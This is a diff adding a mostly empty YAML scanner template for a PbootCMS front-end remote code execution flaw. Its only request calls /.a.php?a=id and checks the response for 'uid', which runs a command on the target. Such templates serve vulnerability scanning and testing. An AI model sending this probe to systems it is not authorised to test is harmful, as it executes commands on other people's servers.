@@ -1,0 +1,17 @@
+id:
+
+info:
+  name: PbootCMS 前台RCE漏洞(poc1)
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /.a.php?a=id
+response1:
+  headers:
+  body: uid
+  code:
+requests2:
+response2:
